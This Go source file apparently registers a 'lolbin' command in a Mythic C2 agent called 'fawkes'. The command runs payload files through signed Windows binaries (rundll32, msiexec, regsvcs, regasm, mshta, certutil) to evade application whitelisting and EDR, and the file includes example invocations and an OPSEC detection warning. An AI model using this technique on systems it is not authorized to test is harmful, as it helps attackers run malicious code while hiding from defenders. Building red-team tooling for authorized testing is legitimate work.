package agentfunctions

import (
	"fmt"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "lolbin",
		Description:         "Signed binary proxy execution — execute payloads through legitimate Windows binaries (LOLBins) to bypass application whitelisting and EDR.",
		HelpString:          "lolbin -action rundll32 -path C:\\payload.dll -export DllMain\nlolbin -action msiexec -path C:\\payload.msi\nlolbin -action regsvcs -path C:\\payload.dll\nlolbin -action regasm -path C:\\payload.dll\nlolbin -action mshta -path C:\\payload.hta\nlolbin -action certutil -path C:\\encoded.b64",
		Version:             1,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1218", "T1218.011", "T1218.007", "T1218.009", "T1218.005"},
		SupportedUIFeatures: []string{},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS:              []string{agentstructs.SUPPORTED_OS_WINDOWS},
			CommandCanOnlyBeLoadedLater: true,
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "action",
				CLIName:       "action",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"rundll32", "msiexec", "regsvcs", "regasm", "mshta", "certutil"},
				Description:   "LOLBin technique: rundll32 (DLL export), msiexec (MSI package), regsvcs/regasm (.NET COM), mshta (HTA/JS), certutil (decode/download)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:     1,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "path",
				CLIName:       "path",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:   "Path to the payload file (DLL, MSI, HTA, or encoded file)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:     2,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "export",
				CLIName:       "export",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "DllMain",
				Description:   "DLL export function name (for rundll32 action only)",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     3,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "args",
				CLIName:       "args",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "",
				Description:   "Additional arguments to pass to the LOLBin",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     4,
						GroupName:            "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			path, _ := taskData.Args.GetStringArg("path")
			msg := fmt.Sprintf("OPSEC WARNING: Signed binary proxy execution via %s (T1218). Executing '%s' through a LOLBin. EDR products monitor child processes of signed binaries. Command-line arguments will be visible in process creation logs (Sysmon Event ID 1).", action, path)
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID: taskData.Task.ID, Success: true,
				OpsecPreBlocked: false, OpsecPreMessage: msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			path, _ := taskData.Args.GetStringArg("path")
			display := fmt.Sprintf("%s → %s", action, path)
			response.DisplayParams = &display
			return response
		},
	})
}
